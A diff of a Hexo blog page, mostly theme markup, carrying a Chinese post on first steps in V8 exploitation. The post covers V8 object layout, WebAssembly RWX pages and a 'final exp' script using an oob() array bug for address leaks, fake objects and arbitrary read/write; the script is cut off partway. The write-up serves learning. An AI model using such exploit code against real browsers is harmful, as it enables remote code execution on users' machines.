@@ -16,15 +16,23 @@
     
 <link rel="stylesheet" href="/css/style.css">
 
-    <link rel="shortcut icon" href="/images/ufo.ico">
-    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/css/font-awesome.min.css">
-    <script id="hexo-configurations">
-    let KEEP = window.KEEP || {};
-    KEEP.hexo_config = {"hostname":"196082.github.io","root":"/","language":"zh-CN","path":"search.json"};
-    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066CC","avatar":"/images/ling.JPG","favicon":"/images/ufo.ico","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":true,"scale":true},"first_screen":{"enable":false,"background_img":"/images/bg.svg","description":"Keep writing and Keep loving."},"scroll":{"progress_bar":{"enable":false},"percent":{"enable":false}}},"local_search":{"enable":true,"preload":true},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":true},"version":"3.4.3"};
-    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 月前","year":"%s 年前"};
+    
+        <link rel="shortcut icon" href="/images/ufo.ico">
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/font/css/fontawesome.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/font/css/regular.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/font/css/solid.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/font/css/brands.min.css">
+    
+    <script class="keep-theme-configurations">
+    const KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"196082.github.io","root":"/","language":"zh-CN","path":"search.json"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"196082's blog","author":196082,"avatar":"/images/ling.JPG","logo":"/images/ling.JPG","favicon":"/images/ufo.ico"},"menu":{"home":"/","archives":"/archives","tags":"/tags","categories":"/categories"},"first_screen":{"enable":false,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"Keep writing and Keep loving.","hitokoto":false},"social_contact":{"enable":false,"links":{"github":null,"weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":false,"percent":false,"hide_header":true},"home":{"announcement":"浅浅更新博客一下吧~","category":true,"tag":true,"post_datetime":"updated"},"post":{"author_badge":{"enable":true,"level_badge":false,"custom_badge":"慢慢好起来"},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":false,"share":false,"reward":{"enable":true,"img_link":"/images/reward.jpg","text":"激励牛马，加速创作！","icon":"fa-solid fa-mug-hot"},"img_align":"center"},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"default"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":true},"comment":{"enable":true,"use":"valine","valine":{"appid":"OcvtJuJHDrSFIyDGdp3rLMtA-gzGzoHsz","appkey":"C672AAYGXMkHxztf8ntdLShs","server_urls":null,"placeholder":"😜若有问题请各位大师傅留言评论"},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.36"},"waline":{"server_url":null,"reaction":false,"version":"3.2.1"},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":true},"feed":{"type":"atom","path":"atom.xml","limit":20},"lazyload":{"enable":true},"cdn":{"enable":true,"provider":"cdnjs"},"pjax":{"enable":false},"footer":{"since":2020,"word_count":true,"site_deploy":{"enable":true,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{},"version":"4.2.2"}
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
+    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
+    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
   </script>
-<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="196082's blog" type="application/atom+xml">
+<meta name="generator" content="Hexo 5.4.2"><link rel="alternate" href="/atom.xml" title="196082's blog" type="application/atom+xml">
 </head>
 
 
@@ -36,67 +44,81 @@
 </div>
 
 
-<main class="page-container">
 
+<main class="page-container border-box">
+    <!-- home first screen  -->
     
 
-    <div class="page-main-content">
-
+    <!-- page content -->
+    <div class="page-main-content border-box">
         <div class="page-main-content-top">
-            <header class="header-wrapper">
-
-    <div class="header-content">
-        <div class="left">
             
-            <a class="logo-title" href="/">
-                196082&#39;s blog
+<header class="header-wrapper">
+
+    <div class="border-box header-content">
+        <div class="left flex-start border-box">
+            
+                <a class="logo-image border-box" href="/">
+                    <img src="/images/ling.JPG">
+                </a>
+            
+            <a class="site-name border-box" href="/">
+               196082&#39;s blog
             </a>
         </div>
 
-        <div class="right">
-            <div class="pc">
-                <ul class="menu-list">
+        <div class="right border-box">
+            <div class="pc border-box">
+                <ul class="menu-list border-box">
                     
-                        <li class="menu-item">
-                            <a class=""
-                               href="/"
-                            >
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/">
+                                
                                 首页
+                                
                             </a>
+                            
                         </li>
                     
-                        <li class="menu-item">
-                            <a class=""
-                               href="/archives"
-                            >
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/archives">
+                                
                                 归档
+                                
                             </a>
+                            
                         </li>
                     
-                        <li class="menu-item">
-                            <a class=""
-                               href="/categories"
-                            >
-                                分类
-                            </a>
-                        </li>
-                    
-                        <li class="menu-item">
-                            <a class=""
-                               href="/tags"
-                            >
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/tags">
+                                
                                 标签
+                                
                             </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/categories">
+                                
+                                分类
+                                
+                            </a>
+                            
                         </li>
                     
                     
                         <li class="menu-item search search-popup-trigger">
-                            <i class="fas fa-search"></i>
+                            <i class="menu-text-color fas search fa-search"></i>
                         </li>
                     
                 </ul>
             </div>
-            <div class="mobile">
+            <div class="mobile border-box flex-start">
                 
                     <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
                 
@@ -108,26 +130,54 @@
     </div>
 
     <div class="header-drawer">
-        <ul class="drawer-menu-list">
+        <ul class="drawer-menu-list border-box">
             
-                <li class="drawer-menu-item flex-center">
-                    <a class=""
-                       href="/">首页</a>
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/">
+                            
+                            首页
+                        </a>
+                        
+                    </label>
+                    
                 </li>
             
-                <li class="drawer-menu-item flex-center">
-                    <a class=""
-                       href="/archives">归档</a>
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/archives">
+                            
+                            归档
+                        </a>
+                        
+                    </label>
+                    
                 </li>
             
-                <li class="drawer-menu-item flex-center">
-                    <a class=""
-                       href="/categories">分类</a>
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/tags">
+                            
+                            标签
+                        </a>
+                        
+                    </label>
+                    
                 </li>
             
-                <li class="drawer-menu-item flex-center">
-                    <a class=""
-                       href="/tags">标签</a>
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/categories">
+                            
+                            分类
+                        </a>
+                        
+                    </label>
+                    
                 </li>
             
         </ul>
@@ -140,85 +190,110 @@
 
         </div>
 
-        <div class="page-main-content-middle">
+        <div class="page-main-content-middle border-box">
 
-            <div class="main-content">
+            <div class="main-content border-box">
+                
+
+                    
+<div class="fade-in-down-animation">
+    <div class="post-page-container border-box">
+        <div class="post-content-container border-box">
+            
+
+            <div class="post-content-bottom border-box">
+                
+                    <div class="post-title">
+                        v8初体验
+                    </div>
+                
 
                 
-                    <div class="fade-in-down-animation">
-    <div class="article-content-container">
+                    <div class="post-header border-box">
+                        
+                            <div class="avatar-box border-box">
+                                <img src="/images/ling.JPG">
+                            </div>
+                        
+                        <div class="info-box">
+                            <div class="author border-box">
+                                <span class="name">196082</span>
+                                
+                                    <span class="author-badge">慢慢好起来</span>
+                                
+                            </div>
+                            <div class="meta-info border-box">
+                                
 
-        <div class="article-title">
-            <span class="title-hover-animation">v8初体验</span>
-        </div>
+<div class="post-meta-info-container border-box post">
+    <div class="post-meta-info border-box">
+        
 
         
-            <div class="article-header">
-                <div class="avatar">
-                    <img src="/images/ling.JPG">
-                </div>
-                <div class="info">
-                    <div class="author">
-                        <span class="name">196082</span>
-                        
-                            <span class="author-label">切勿浮躁,绝不摆烂!</span>
-                        
-                    </div>
-                    <div class="meta-info">
-                        <div class="article-meta-info">
-    <span class="article-date article-meta-item">
-        <i class="fas fa-edit"></i>&nbsp;2023-06-27 20:05:06
-    </span>
-    
-        <span class="article-categories article-meta-item">
-            <i class="fas fa-folder"></i>&nbsp;
-            <ul>
-                
-                    <li>
-                        <a href="/categories/chrome-pwn/">chrome-pwn</a>&nbsp;
-                    </li>
-                
-            </ul>
-        </span>
-    
-    
-        <span class="article-tags article-meta-item">
-            <i class="fas fa-tags"></i>&nbsp;
-            <ul>
-                
-                    <li>
-                        <a href="/tags/overstep/">overstep</a>&nbsp;
-                    </li>
-                
-            </ul>
-        </span>
-    
+            <span class="meta-info-item post-create-date">
+                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
+                <span class="datetime">2023-06-27 20:05:06</span>
+            </span>
 
-    
-    
-        <span class="article-wordcount article-meta-item">
-            <i class="fas fa-file-word"></i>&nbsp;<span>4.7k 字</span>
-        </span>
-    
-    
-        <span class="article-min2read article-meta-item">
-            <i class="fas fa-clock"></i>&nbsp;<span>23 分钟</span>
-        </span>
-    
-    
-        <span class="article-pv article-meta-item">
-            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
-        </span>
+            <span class="meta-info-item post-update-date">
+                <i class="icon fa-solid fa-file-pen"></i>&nbsp;
+                <span class="datetime" data-updated="Tue Jun 27 2023 20:05:13 GMT+0800">2023-06-27 20:05:13</span>
+            </span>
+        
+
+        
+            <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
+                <ul class="post-category-ul">
+                    
+                            <li class="category-item"><a href="/categories/chrome-pwn/">chrome-pwn</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+            <span class="post-tag meta-info-item border-box">
+                <ul class="post-tag-ul">
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/overstep/">overstep</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+        
+            <span class="meta-info-item post-wordcount">
+                <i class="icon fas fa-file-word"></i>&nbsp;<span>4.7k 字</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-min2read">
+                <i class="icon fas fa-clock"></i>&nbsp;<span>23 分钟</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-pv">
+                <i class="icon fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+            </span>
+        
+    </div>
+
     
 </div>
 
+                            </div>
+                        </div>
                     </div>
-                </div>
-            </div>
-        
+                
 
-        <div class="article-content markdown-body">
-            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这段事情因为各种事情耽搁，一直没有更新文章。本打算新的一篇出<code>rootkit</code>来水一篇，后面发现a3佬写的太多了，不想继续看了。然后前阵子一直在思考后续到底是学什么方向，在docker逃逸、chrome内核、iot还有fuzz之间犹豫不决，现在也算是下定决心来学学chrome了，只希望能够快点搞完，后面还是打算更多的去学习docker逃逸。</p>
+                <div class="post-content keep-markdown-body ">
+                    
+
+                    
+                         <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这段事情因为各种事情耽搁，一直没有更新文章。本打算新的一篇出<code>rootkit</code>来水一篇，后面发现a3佬写的太多了，不想继续看了。然后前阵子一直在思考后续到底是学什么方向，在docker逃逸、chrome内核、iot还有fuzz之间犹豫不决，现在也算是下定决心来学学chrome了，只希望能够快点搞完，后面还是打算更多的去学习docker逃逸。</p>
 <p>这里就不提环境安装的事情了，网上有很多相关资料。</p>
 <h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>js作为一个面向对象编程的语言，他的变量都是以类的形式表现的。并且js作为动态语言，他的类成员是可以改变的，这也就导致他在内存中的存在形式相交与C语言要复杂的多。</p>
 <p>使用如下程序进行调试：</p>
@@ -283,20 +358,10 @@
 <h4 id="最终利用-非传统方式"><a href="#最终利用-非传统方式" class="headerlink" title="最终利用: 非传统方式"></a><strong>最终利用: 非传统方式</strong></h4><p>这种方法则是往程序中写shellcode，但是程序自身并没有rwx的段。不过存在这样一种技术wasm，使用 <a class="link"   target="_blank" rel="noopener" href="https://wasdk.github.io/WasmFiddle" >这个网站<i class="fas fa-external-link-alt"></i></a> 可以生成一段wasm码，可以用生成一个函数对象：</p>
 <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> WebAssembly.Module(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> WebAssembly.Instance(wasmModule, &#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> f = wasmInstance.exports.main;</span><br></pre></td></tr></table></figure>
 
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/image-20230627191416891.png"
-                      alt="image-20230627191416891"
-                ></p>
+<p><img   src="/images/image-20230627191416891.png"  alt="image-20230627191416891"></p>
 <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">133</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">96</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">127</span>, <span class="number">3</span>, <span class="number">130</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">112</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">131</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">129</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">145</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">121</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">109</span>, <span class="number">97</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">138</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">42</span>, <span class="number">11</span>]);</span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> WebAssembly.Module(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> WebAssembly.Instance(wasmModule, &#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> f = wasmInstance.exports.main;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(f());</span><br><span class="line">% DebugPrint(f);</span><br><span class="line">% SystemBreak();</span><br></pre></td></tr></table></figure>
 
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/image-20230627191458616.png"
-                      alt="image-20230627191458616"
-                ></p>
+<p><img   src="/images/image-20230627191458616.png"  alt="image-20230627191458616"></p>
 <p>当我们运行可以看到确实是返回了42。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job 0x365390d5faf9</span><br><span class="line">0x365390d5faf9: [Function] in OldSpace</span><br><span class="line"> - map: 0x309e6c9c4379 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x365390d42109 &lt;JSFunction (sfi = 0x2a087603b29)&gt;</span><br><span class="line"> - elements: 0x2754f1600c71 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - function prototype: &lt;no-prototype-slot&gt;</span><br><span class="line"> - shared_info: 0x365390d5fac1 &lt;SharedFunctionInfo 0&gt;</span><br><span class="line"> - name: 0x2754f1604ae1 &lt;String[#1]: 0&gt;</span><br><span class="line"> - formal_parameter_count: 0</span><br><span class="line"> - kind: NormalFunction</span><br><span class="line"> - context: 0x365390d41869 &lt;NativeContext[246]&gt;</span><br><span class="line"> - code: 0x18b055a42001 &lt;Code JS_TO_WASM_FUNCTION&gt;</span><br><span class="line"> - WASM instance 0x365390d5f901</span><br><span class="line"> - WASM function index 0</span><br><span class="line"> - properties: 0x2754f1600c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x02a0876004b9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line">    #name: 0x02a087600449 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line">    #arguments: 0x02a087600369 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line">    #caller: 0x02a0876003d9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
 
@@ -315,212 +380,290 @@
 <p>上面这是我抄的用于生成js的shellcode的python脚本，在开头留有原作者链接。</p>
 <h3 id="最终exp"><a href="#最终exp" class="headerlink" title="最终exp"></a>最终exp</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">var</span> float64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(buf);</span><br><span class="line"><span class="keyword">var</span> uint64 = <span class="keyword">new</span> <span class="built_in">BigUint64Array</span>(buf);</span><br><span class="line"></span><br><span class="line"><span class="comment">// @param &#123;float64&#125; float_num</span></span><br><span class="line"><span class="comment">// @return &#123;uint64&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f2i</span>(<span class="params">float_num</span>) </span>&#123;</span><br><span class="line">    float64[<span class="number">0</span>] = float_num;</span><br><span class="line">    <span class="keyword">return</span> uint64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// @param &#123;uint64&#125; uint64_num</span></span><br><span class="line"><span class="comment">// @return &#123;float64&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">i2f</span>(<span class="params">uint64_num</span>) </span>&#123;</span><br><span class="line">    uint64[<span class="number">0</span>] = uint64_num;</span><br><span class="line">    <span class="keyword">return</span> float64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj = &#123; <span class="string">&quot;a&quot;</span>: <span class="number">1</span> &#125;;</span><br><span class="line"><span class="keyword">var</span> obj_array = [obj];</span><br><span class="line"><span class="keyword">var</span> flt_array = [<span class="number">1.1</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj_array_map = obj_array.oob();</span><br><span class="line"><span class="keyword">var</span> flt_array_map = flt_array.oob();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">address_of</span>(<span class="params">leak_obj</span>) </span>&#123;</span><br><span class="line">    obj_array[<span class="number">0</span>] = leak_obj;</span><br><span class="line">    obj_array.oob(flt_array_map);</span><br><span class="line">    <span class="keyword">var</span> res = obj_array[<span class="number">0</span>];</span><br><span class="line">    obj_array.oob(obj_array_map);</span><br><span class="line">    <span class="keyword">return</span> f2i(res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fake_object</span>(<span class="params">address</span>) </span>&#123;</span><br><span class="line">    flt_array[<span class="number">0</span>] = i2f(address);</span><br><span class="line">    flt_array.oob(obj_array_map);</span><br><span class="line">    <span class="keyword">var</span> fake_obj = flt_array[<span class="number">0</span>];</span><br><span class="line">    flt_array.oob(flt_array_map);</span><br><span class="line">    <span class="keyword">return</span> fake_obj;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> arb_rw_arr = [flt_array_map, <span class="number">1.2</span>, <span class="number">1.3</span>, <span class="number">1.4</span>];</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;arb_rw_arr =&gt; 0x&quot;</span>, (address_of(arb_rw_arr) - <span class="number">0x20n</span>).toString(<span class="number">16</span>).trim());</span><br><span class="line"><span class="keyword">var</span> fake_obj = fake_object(address_of(arb_rw_arr) - <span class="number">0x20n</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">arbitrary_read</span>(<span class="params">address</span>) </span>&#123;</span><br><span class="line">    arb_rw_arr[<span class="number">2</span>] = i2f(address - <span class="number">0x10n</span> + <span class="number">0x1n</span>)</span><br><span class="line">    <span class="keyword">return</span> f2i(fake_obj[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> buffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">16</span>);</span><br><span class="line"><span class="keyword">var</span> data_view = <span class="keyword">new</span> <span class="built_in">DataView</span>(buffer);</span><br><span class="line"><span class="keyword">var</span> buf_backing_store_addr = address_of(buffer) - <span class="number">1n</span> + <span class="number">0x20n</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">arbitrary_write</span>(<span class="params">address, value</span>) </span>&#123;</span><br><span class="line">    arb_rw_arr[<span class="number">2</span>] = i2f(buf_backing_store_addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>);</span><br><span class="line">    fake_obj[<span class="number">0</span>] = i2f(address);</span><br><span class="line">    data_view.setFloat64(<span class="number">0</span>, i2f(value), <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = [<span class="number">1.1</span>];</span><br><span class="line"><span class="keyword">var</span> code_addr = arbitrary_read(address_of(a.constructor) + <span class="number">0x30n</span> - <span class="number">1n</span>) - <span class="number">1n</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;code_addr =&gt; 0x&#x27;</span> + code_addr.toString(<span class="number">16</span>).trim());</span><br><span class="line"><span class="keyword">var</span> v8_addr = arbitrary_read(code_addr + <span class="number">0x42n</span>);</span><br><span class="line"><span class="keyword">var</span> v8_base = v8_addr - <span class="number">0xfc8780n</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;v8_base =&gt; 0x&#x27;</span> + v8_base.toString(<span class="number">16</span>).trim());</span><br><span class="line"><span class="keyword">var</span> free_got_addr = v8_base + <span class="number">0x12aa8b8n</span>;</span><br><span class="line"><span class="keyword">var</span> free_addr = arbitrary_read(free_got_addr);</span><br><span class="line"><span class="keyword">var</span> 